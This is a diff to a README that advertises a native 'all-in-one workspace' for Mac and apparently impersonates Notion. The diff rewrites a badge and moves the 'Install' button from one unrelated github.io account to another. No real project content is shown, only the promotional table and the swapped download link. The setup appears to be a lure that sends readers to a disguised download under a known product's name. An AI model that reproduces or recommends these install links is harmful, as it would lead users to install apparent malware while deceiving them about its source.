@@ -8,14 +8,14 @@
 <p align="center">
   <img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/>
   &nbsp;
-  <img src="https://img.shields.io/badge/all-in-one_workspace-blue?style=flat-square"/>
+  <img src="https://img.shields.io/badge/note_workspace-blue?style=flat-square"/>
   &nbsp;
   <img src="https://img.shields.io/badge/Apple_Silicon-Ready-orange?style=flat-square"/>
 </p>
 
 ---
 
-| [![Install](https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png)](https://gnida-programs.github.io/.github/notion) | **Native all-in-one workspace built for Mac professionals** <br><br> No setup, no friction. Built on macOS frameworks, runs on Intel and Apple Silicon with a clean interface and powerful tools for everyday use. |
+| [![Install](https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png)](https://vengalbi-motors.github.io/.github/notion) | **Native all-in-one workspace built for Mac professionals** <br><br> No setup, no friction. Built on macOS frameworks, runs on Intel and Apple Silicon with a clean interface and powerful tools for everyday use. |
 |---|---|
 
 ---
